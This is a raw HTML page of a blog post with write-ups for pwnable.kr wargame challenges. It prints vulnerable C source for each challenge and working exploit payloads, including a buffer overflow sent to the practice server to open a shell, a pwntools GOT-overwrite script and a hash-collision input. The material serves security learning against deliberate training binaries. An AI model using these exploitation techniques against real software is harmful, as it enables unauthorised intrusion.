<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>pwnable.kr Writeups | 0xlightyear's Blog</title><meta name=keywords content="Wargames,CTF"><meta name=description content="If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.
In my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn."><meta name=author content="0xlightyear"><link rel=canonical href=https://0xlightyear.github.io/posts/pwnable_kr_writeups/><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://0xlightyear.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0xlightyear.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0xlightyear.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://0xlightyear.github.io/apple-touch-icon.png><link rel=mask-icon href=https://0xlightyear.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="pwnable.kr Writeups"><meta property="og:description" content="If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.
In my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn."><meta property="og:type" content="article"><meta property="og:url" content="https://0xlightyear.github.io/posts/pwnable_kr_writeups/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-26T21:52:52+10:00"><meta property="article:modified_time" content="2023-04-26T21:52:52+10:00"><meta property="og:site_name" content="0xlightyear's Blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="pwnable.kr Writeups"><meta name=twitter:description content="If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.
In my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://0xlightyear.github.io/posts/"},{"@type":"ListItem","position":2,"name":"pwnable.kr Writeups","item":"https://0xlightyear.github.io/posts/pwnable_kr_writeups/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"pwnable.kr Writeups","name":"pwnable.kr Writeups","description":"If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.","keywords":["Wargames","CTF"],"articleBody":"If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.\nIn this article, I will share my experience solving each challenge on pwnable.kr, as well as what I have learned along the way.\nfd - 1 pt // fd.c #include #include #include char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } We noticed that if buf == LETMEWIN then the program will start a new subprocess to execute \"/bin/cat flag\". We can see the permission of the compiled file fd and flag are\n-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd -r--r----- 1 fd_pwn root 50 Jun 11 2014 flag This permission tells us that when we run fd as fd users, the euid of the process will be fd_pwn, which is good enough to read flag.\nNow it is quite clear on how to pwn this program.\nif(!strcmp(\"LETMEWIN\\n\", buf)) -\u003e let the string in buf equals to “LETMEWIN\\n”, so that the program can help us read the flag len = read(fd, buf, 32); -\u003e let fd equals to 0 so that we can fill buf via standard input. int fd = atoi( argv[1] ) - 0x1234; let argv[1] equals 4660 (decimal representation of 0x1234) to make fd 0. final payload: echo \"LETMEWIN\" | ./fd $(python -c \"print(0x1234)\") ps: echo adds a \\n by default.\ncollision - 3 pt // col.c #include #include unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u003c5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u003c2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } To successfully run the program, we must provide 20 bytes as the first argument. The check_password function takes 20 bytes(the first argument), splits them into five groups of four bytes each, and treats each group as an integer. This gives us five integers in total. If the sum of these five integers equals the pre-defined hashcode value of 0x21DD09EC, then the flag will be printed. By performing some calculations, we can determine that the five integers needed to match hashcode are 0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cecc. Considering the little endian byte order, we can construct our final payload accordingly.\nfinal payload:\necho -en \"\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\" | xargs ./col bof - 5 pt // bof.c #include #include #include void func(int key){ char overflowme[32]; printf(\"overflow me : \"); gets(overflowme);\t// smash me! if(key == 0xcafebabe){ system(\"/bin/sh\"); } else{ printf(\"Nah..\\n\"); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Classic stack buffer overflow. The root cause of the stack overflow is that the function designed to take user input, such as read, is longer than what it was intended to hold. Here we have gets, this function takes unlimited number of characters whereas overflowme array can only hold upto 32 bytes. In general, we can use a bof vulnerability to manipulate the rip or instruction pointer to control the program flow. However, in this case, the solution is simpler. All we need to do is change the key to 0xcafebabe to exploit this program. Since key is an argument rather than a local variable, we can overwrite the buffer overflowme from the beginning to the rbp/ebp+8 to change its value. It is important to note that system(\"/bin/sh\") is a subprocess that will terminate when the parent process ends. Therefore, we use the cat trick to obtain a persistent shell.\nfinal payload:\n(echo -en \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\"; cat) | nc pwnable.kr 9000 flag - 7 pt This challenge is a reverse enginnering challenge. The flag is in the binary itself.\nRun file flag to get some basic info about this file\nflag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header An ELF with no section header looks suspecious. Then we run strings flag to see whether there is something interesting inside.\nUPX! ... $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ ... UPX! UPX! ... Boom! It’s UPX. We can unpack it by running upx -d flag\nUltimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar \u0026 John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 883745 \u003c- 335288 37.94% linux/amd64 flag Unpacked 1 file. Now put the unpacked file into idapro, understand that all this program do is to copy a string (our flag) to a malloc address. We can use gdb to dynamically check the string stored at that malloc address to get the flag.\n0x0000000000401180 in main () 1: x/10i $rip =\u003e 0x401180 : mov QWORD PTR [rbp-0x8],rax 0x401184 : mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 0x40118b : mov rax,QWORD PTR [rbp-0x8] 0x40118f : mov rsi,rdx 0x401192 : mov rdi,rax 0x401195 : call 0x400320 0x40119a : mov eax,0x0 0x40119f : leave 0x4011a0 : ret 0x4011a1: nop (gdb) p/x $rax \u003c- the address that malloc gives us $2 = 0x6c96b0 ... 0x000000000040119a in main () 1: x/10i $rip =\u003e 0x40119a : mov eax,0x0 0x40119f : leave 0x4011a0 : ret 0x4011a1: nop 0x4011a2: nop 0x4011a3: nop 0x4011a4: nop 0x4011a5: nop 0x4011a6: nop 0x4011a7: nop (gdb) x/s 0x6c96b0 \u003c- check what's in this address 0x6c96b0: \"UPX...? sounds like a delivery service :)\" passcode - 10 pt // passcode.c #include #include void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } Upon auditing the code, we can find that the problem is scanf(\"%d\", passcode1) (as well as scanf(\"%d\", passcode2)). The intended behavior is to use scanf(\"%d\", \u0026passcode1) instead. In the current code, the value of passcode1 is being interpreted as an address, and the input from standard input is being saved to the address stored in passcode1. As passcode1 is not initialized, its value will be whatever is on the stack, which in most cases will be a polluted value. In this challenge, we can take advantage of the name array in the welcome function to pollute this value. By checking the assembly code of the ELF we can see that name starts at ebp-0x70 and the address of password1 is ebp-0x10. We can input 96 bytes as padding and 4 bytes as the value of passcode1, which will be the address to have our next input by scanf(\"%d\", passcode1)\nNow we have the ability to write data to arbitary address, what address is the most interesting one? Here we decide to hijack GOT table.\nreadelf -a passcode ... 0804a004 00000207 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 ... objdump -d -M intel passcode ... 80485e3:\tc7 04 24 af 87 04 08 mov DWORD PTR [esp],0x80487af 80485ea:\te8 71 fe ff ff call 8048460 ... We overwrite 0x080485e3 to 0x0804a004 to trick the program so that when the program calls fflush(), it actually runs system(\"/bin/cat flag\")\nfinal payload:\n# payload for passcode from pwn import * p = process('/home/passcode/passcode') padding = b'A' * 96 addr = p32(0x0804a004) target = bytes(int('0x080485e3', base=16)) payload = padding + addr + b'\\n' + target + b'\\n' + b'1\\n' p.send(payload) p.interactive() There are something we need to pay attention to when we hijack GOT table.\nThe reason why we can make use of 0x0804a004 and 0x080485e3 is because this program compiles with NO PIE, otherwise these address will be relative offsets and we can’t use them directly. We can only hijack GOT table when the security settings is Partial RELRO. If it is set to Full RELRO we won’t have write permission to hijack GOT table. By hijacking the GOT table, we can make the program BELIEVE that system(\"/bin/cat flag\") IS fflush(). However, this challenge is tailored to take advantage of fflush. In a real-world program, fflush may be used somewhere else and play a critical role in the program. When we hijack the GOT table, we are likely to crash the program before it reaches the point where we hope to use the hijacked functions. In this case we cannot use this trick. scanf(\"%d\", passcode1) requires we input an integer as an address, hence we cannot input something like 0x080485e3. Instead, we need to convert it to decimal (that’s why we have bytes(int()) in the payload) to get the correct result. Another thing I learned from this challenge is the difference between PIE and ASLR. I consulted with robwaz. Here is his perfect explanation.\nThis is a common misunderstanding. PIE != ASLR PIE randomizes the location the binary is loaded into memory. This impacts the code location, which you have observed is constant. ASLR randomizes other memory mapped into the binary at runtime, such as the stack, heap, etc. They serve a very similar purpose, but they are in fact two different mechanism. PIE is something that is determined at compile time. The binary must be compiled to be a position independent executable. This means the addresses referenced inside the assembly of the binary are all relative. Which allows the binary to be ran while loaded at different location offsets. ASLR is something done at run time when memory is mapped. It randomizes part of the memory addresses. This can be done to any binary with no impact, as a binary references the stack, heap, etc based on values it observes while running (or relatively). random - 1 pt // random.c int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", \u0026key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0; } The problem is it is using rand() without srand() which fails to give rand() a random seed. This leads to rand() is using a default value 1 and lost its randomness and became predictable.\nfinal payload:\n// payload.c #include int main(){ unsigned int random; random = rand(); // random value! printf(\"%u\", 0xdeadbeef ^ random); return 0; } The printed value is the payload value we input to the challenge program.\ninput - 4 pt // input.c #include #include #include #include int main(int argc, char* argv[], char* envp[]){ printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\"socket error, tell admin\\n\"); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)\u0026saddr, sizeof(saddr)) \u003c 0){ printf(\"bind error, use another port\\n\"); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)\u0026caddr, (socklen_t*)\u0026c); if(cd \u003c 0){ printf(\"accept error, tell admin\\n\"); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0; } This challenge is about the interactiton with the program, including parameters passage, env arguments, file descriptors, and network connection. Due to permission issue, we need to create a softlink for the flag using os.system('ln -s /home/input2/flag /tmp/flag'). The final payload can be implemented by any language.\nfinal payload:\nfrom pwn import * import os import time os.system('ln -s /home/input2/flag /tmp/flag') # stage 1 argv = ['/home/input2/input'] + ['A'] * 99 argv[ord('A')] = '\\x00' argv[ord('B')] = '\\x20\\x0a\\x0d' # stage 2 pr1, pw1 = os.pipe() pr2, pw2 = os.pipe() p1_content = '\\x00\\x0a\\x00\\xff' p2_content = '\\x00\\x0a\\x02\\xff' os.write(pw1, p1_content) os.write(pw2, p2_content) # stage 3 env = {'\\xde\\xad\\xbe\\xef': '\\xca\\xfe\\xba\\xbe'} # stage 4 with open ('\\x0a', 'wb') as f: f.write(b'\\x00\\x00\\x00\\x00') # stage 5 - part1 argv[ord('C')] = '23333' p = process(argv=argv, stdin=pr1, stderr=pr2, env=env, cwd='/tmp') # stage 5 - part2 io = remote('localhost', 23333) io.sendline(b'\\xde\\xad\\xbe\\xef') p.interactive() leg - 2 pt #include #include int key1(){ asm(\"mov r3, pc\\n\"); } int key2(){ asm( \"push\t{r6}\\n\" \"add\tr6, pc, $1\\n\" \"bx\tr6\\n\" \".code 16\\n\" \"mov\tr3, pc\\n\" \"add\tr3, $0x4\\n\" \"push\t{r3}\\n\" \"pop\t{pc}\\n\" \".code\t32\\n\" \"pop\t{r6}\\n\" ); } int key3(){ asm(\"mov r3, lr\\n\"); } int main(){ int key=0; printf(\"Daddy has very strong arm! : \"); scanf(\"%d\", \u0026key); if( (key1()+key2()+key3()) == key ){ printf(\"Congratz!\\n\"); int fd = open(\"flag\", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(\"I have strong leg :P\\n\"); } return 0; } (gdb) disass main Dump of assembler code for function main: 0x00008d3c \u003c+0\u003e:\tpush\t{r4, r11, lr} 0x00008d40 \u003c+4\u003e:\tadd\tr11, sp, #8 0x00008d44 \u003c+8\u003e:\tsub\tsp, sp, #12 0x00008d48 \u003c+12\u003e:\tmov\tr3, #0 0x00008d4c \u003c+16\u003e:\tstr\tr3, [r11, #-16] 0x00008d50 \u003c+20\u003e:\tldr\tr0, [pc, #104]\t; 0x8dc0 0x00008d54 \u003c+24\u003e:\tbl\t0xfb6c 0x00008d58 \u003c+28\u003e:\tsub\tr3, r11, #16 0x00008d5c \u003c+32\u003e:\tldr\tr0, [pc, #96]\t; 0x8dc4 0x00008d60 \u003c+36\u003e:\tmov\tr1, r3 0x00008d64 \u003c+40\u003e:\tbl\t0xfbd8 \u003c__isoc99_scanf\u003e 0x00008d68 \u003c+44\u003e:\tbl\t0x8cd4 0x00008d6c \u003c+48\u003e:\tmov\tr4, r0 0x00008d70 \u003c+52\u003e:\tbl\t0x8cf0 0x00008d74 \u003c+56\u003e:\tmov\tr3, r0 0x00008d78 \u003c+60\u003e:\tadd\tr4, r4, r3 0x00008d7c \u003c+64\u003e:\tbl\t0x8d20 0x00008d80 \u003c+68\u003e:\tmov\tr3, r0 0x00008d84 \u003c+72\u003e:\tadd\tr2, r4, r3 0x00008d88 \u003c+76\u003e:\tldr\tr3, [r11, #-16] 0x00008d8c \u003c+80\u003e:\tcmp\tr2, r3 0x00008d90 \u003c+84\u003e:\tbne\t0x8da8 0x00008d94 \u003c+88\u003e:\tldr\tr0, [pc, #44]\t; 0x8dc8 0x00008d98 \u003c+92\u003e:\tbl\t0x1050c 0x00008d9c \u003c+96\u003e:\tldr\tr0, [pc, #40]\t; 0x8dcc 0x00008da0 \u003c+100\u003e:\tbl\t0xf89c 0x00008da4 \u003c+104\u003e:\tb\t0x8db0 0x00008da8 \u003c+108\u003e:\tldr\tr0, [pc, #32]\t; 0x8dd0 0x00008dac \u003c+112\u003e:\tbl\t0x1050c 0x00008db0 \u003c+116\u003e:\tmov\tr3, #0 0x00008db4 \u003c+120\u003e:\tmov\tr0, r3 0x00008db8 \u003c+124\u003e:\tsub\tsp, r11, #8 0x00008dbc \u003c+128\u003e:\tpop\t{r4, r11, pc} 0x00008dc0 \u003c+132\u003e:\tandeq\tr10, r6, r12, lsl #9 0x00008dc4 \u003c+136\u003e:\tandeq\tr10, r6, r12, lsr #9 0x00008dc8 \u003c+140\u003e:\t; instruction: 0x0006a4b0 0x00008dcc \u003c+144\u003e:\t; instruction: 0x0006a4bc 0x00008dd0 \u003c+148\u003e:\tandeq\tr10, r6, r4, asr #9 End of assembler dump. (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 \u003c+0\u003e:\tpush\t{r11}\t; (str r11, [sp, #-4]!) 0x00008cd8 \u003c+4\u003e:\tadd\tr11, sp, #0 0x00008cdc \u003c+8\u003e:\tmov\tr3, pc 0x00008ce0 \u003c+12\u003e:\tmov\tr0, r3 0x00008ce4 \u003c+16\u003e:\tsub\tsp, r11, #0 0x00008ce8 \u003c+20\u003e:\tpop\t{r11}\t; (ldr r11, [sp], #4) 0x00008cec \u003c+24\u003e:\tbx\tlr End of assembler dump. (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 \u003c+0\u003e:\tpush\t{r11}\t; (str r11, [sp, #-4]!) 0x00008cf4 \u003c+4\u003e:\tadd\tr11, sp, #0 0x00008cf8 \u003c+8\u003e:\tpush\t{r6}\t; (str r6, [sp, #-4]!) 0x00008cfc \u003c+12\u003e:\tadd\tr6, pc, #1 0x00008d00 \u003c+16\u003e:\tbx\tr6 0x00008d04 \u003c+20\u003e:\tmov\tr3, pc 0x00008d06 \u003c+22\u003e:\tadds\tr3, #4 0x00008d08 \u003c+24\u003e:\tpush\t{r3} 0x00008d0a \u003c+26\u003e:\tpop\t{pc} 0x00008d0c \u003c+28\u003e:\tpop\t{r6}\t; (ldr r6, [sp], #4) 0x00008d10 \u003c+32\u003e:\tmov\tr0, r3 0x00008d14 \u003c+36\u003e:\tsub\tsp, r11, #0 0x00008d18 \u003c+40\u003e:\tpop\t{r11}\t; (ldr r11, [sp], #4) 0x00008d1c \u003c+44\u003e:\tbx\tlr End of assembler dump. (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 \u003c+0\u003e:\tpush\t{r11}\t; (str r11, [sp, #-4]!) 0x00008d24 \u003c+4\u003e:\tadd\tr11, sp, #0 0x00008d28 \u003c+8\u003e:\tmov\tr3, lr 0x00008d2c \u003c+12\u003e:\tmov\tr0, r3 0x00008d30 \u003c+16\u003e:\tsub\tsp, r11, #0 0x00008d34 \u003c+20\u003e:\tpop\t{r11}\t; (ldr r11, [sp], #4) 0x00008d38 \u003c+24\u003e:\tbx\tlr End of assembler dump. (gdb) This is the first time I deal with ARM, it looks similar to x86 architecture but has some unique feature.\nlr register stores return address, the same as ebp+4 or rbp+8 in x86 architecture. To improve CPU performance, ARM uses 3-stage pipeline (note: currently we have 5-stage pipeline but the idea is similar). The whole lifecycle of one instruction includes 1.fetch 2.decode 3.execute. While current instruction is being executed, next instruction must be in decode phaze and the instruction after is being fetched. pc register points to the instruction that is being fetched, which means when we look at a specific instruction, the referred pc register holds the address of the instruction after next one, it should be either +4 in thumb mode or +8 in ARM mode. The length of a single instruction in x86 is not fixed whereas in ARM the length is 2 bytes in thumb mode and 4 bytes in ARM mode. Back to this challenge, we need to calculate the sum of each function to get the flag.\nkey1\n0x00008cdc \u003c+8\u003e:\tmov\tr3, pc \u003c- r3 = 0x8ce4 0x00008ce0 \u003c+12\u003e:\tmov\tr0, r3 0x00008ce4 \u003c+16\u003e:\tsub\tsp, r11, #0 key1 = 0x8ce4 key2\n0x00008d04 \u003c+20\u003e:\tmov\tr3, pc \u003c- r3 = 0x8d08 0x00008d06 \u003c+22\u003e:\tadds\tr3, #4 \u003c- r3 = r3 + 4 = 0x8d0c 0x00008d08 \u003c+24\u003e:\tpush\t{r3} key2 = 0x8d0c key3\n... 0x00008d7c \u003c+64\u003e:\tbl\t0x8d20 0x00008d80 \u003c+68\u003e:\tmov\tr3, r0 ... ... 0x00008d28 \u003c+8\u003e:\tmov\tr3, lr \u003c- r3 = 0x8d80 0x00008d2c \u003c+12\u003e:\tmov\tr0, r3 ... key3 = 0x8d80 final payload = key1 + key2 + key3 = 108400\nTBC\n","wordCount":"3070","inLanguage":"en","datePublished":"2023-04-26T21:52:52+10:00","dateModified":"2023-04-26T21:52:52+10:00","author":{"@type":"Person","name":"0xlightyear"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xlightyear.github.io/posts/pwnable_kr_writeups/"},"publisher":{"@type":"Organization","name":"0xlightyear's Blog","logo":{"@type":"ImageObject","url":"https://0xlightyear.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://0xlightyear.github.io/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://0xlightyear.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://0xlightyear.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://0xlightyear.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://0xlightyear.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0xlightyear.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://0xlightyear.github.io/posts/>Posts</a></div><h1 class=post-title>pwnable.kr Writeups</h1><div class=post-meta><span title='2023-04-26 21:52:52 +1000 +1000'>April 26, 2023</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;0xlightyear</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#fd---1-pt aria-label="fd - 1 pt">fd - 1 pt</a></li><li><a href=#collision---3-pt aria-label="collision - 3 pt">collision - 3 pt</a></li><li><a href=#bof---5-pt aria-label="bof - 5 pt">bof - 5 pt</a></li><li><a href=#flag---7-pt aria-label="flag - 7 pt">flag - 7 pt</a></li><li><a href=#passcode---10-pt aria-label="passcode - 10 pt">passcode - 10 pt</a></li><li><a href=#random---1-pt aria-label="random - 1 pt">random - 1 pt</a></li><li><a href=#input---4-pt aria-label="input - 4 pt">input - 4 pt</a></li><li><a href=#leg---2-pt aria-label="leg - 2 pt">leg - 2 pt</a></li></ul></div></details></div><div class=post-content><p>If you are interested in <code>pwn</code> or <code>binary exploitation</code> challenges, <a href=https://pwnable.kr>pwnable.kr</a> is a great platform to test your skills. Unlike traditional CTF games on <a href=https://ctftime.org>ctftime</a>, <a href=https://pwnable.kr>pwnable.kr</a> does not have a time limit, allowing you to work on the challenges at your own pace.</p><p>In my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some <code>computer science</code> background, understand how <code>systems</code> and <code>programs</code> work, and are interested in learning more about <code>hacking</code> and <code>pwn</code>.</p><p>In this article, I will share my experience solving each challenge on <a href=https://pwnable.kr>pwnable.kr</a>, as well as what I have learned along the way.</p><h2 id=fd---1-pt>fd - 1 pt<a hidden class=anchor aria-hidden=true href=#fd---1-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// fd.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>32</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[], <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> envp[]){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(argc<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>2</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;pass argv[1] a number</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
